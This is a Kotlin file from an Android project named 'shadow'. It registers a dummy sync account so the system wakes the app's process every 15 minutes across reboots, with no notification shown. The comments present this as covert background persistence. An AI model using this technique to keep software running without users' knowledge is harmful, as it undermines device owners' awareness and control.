package com.shadow

import android.accounts.Account
import android.accounts.AccountManager
import android.content.ContentResolver
import android.content.Context
import android.os.Bundle
import android.util.Log

/**
 * Creates the sync account (once) and registers the periodic sync. This is the
 * seed of the system-spawned path: after this runs a single time, SyncManager owns
 * the scheduling and will keep waking the process every ~15 min, across reboots,
 * with no notification and no receiver of ours firing.
 *
 * Fully idempotent — safe to call from provider onCreate, boot, or each sync.
 */
object AccountRegistrar {

    private const val TAG = "ShadowAccount"

    /** 15 minutes — SyncManager's minimum granularity. */
    private const val SYNC_INTERVAL_SECONDS = 15L * 60L

    fun ensure(ctx: Context) {
        try {
            val am = AccountManager.get(ctx)
            val existing = am.getAccountsByType(ShadowAuthenticator.ACCOUNT_TYPE)
            val account = if (existing.isNotEmpty()) {
                existing[0]
            } else {
                val a = Account(ShadowAuthenticator.ACCOUNT_NAME, ShadowAuthenticator.ACCOUNT_TYPE)
                // addAccountExplicitly returns false if it already exists — either way
                // we proceed with the account object.
                val ok = am.addAccountExplicitly(a, null, null)
                Log.i(TAG, "addAccountExplicitly=$ok")
                a
            }

            // Advertise the sync cap so the framework treats this as a real sync app.
            runCatching {
                ContentResolver.setIsSyncable(account, ShadowAuthenticator.AUTHORITY, 1)
            }
            // Master switch for this account's sync.
            runCatching {
                ContentResolver.setSyncAutomatically(
                    account, ShadowAuthenticator.AUTHORITY, true
                )
            }
            // The actual periodic wake. Requires that automagic+periodic sync are
            // both enabled and the account is syncable, which we just asserted above.
            runCatching {
                ContentResolver.addPeriodicSync(
                    account,
                    ShadowAuthenticator.AUTHORITY,
                    Bundle.EMPTY,
                    SYNC_INTERVAL_SECONDS,
                )
            }
            Log.i(TAG, "periodic sync registered: $SYNC_INTERVAL_SECONDS s")
        } catch (e: Throwable) {
            Log.w(TAG, "ensure failed: ${e.message}")
        }
    }
}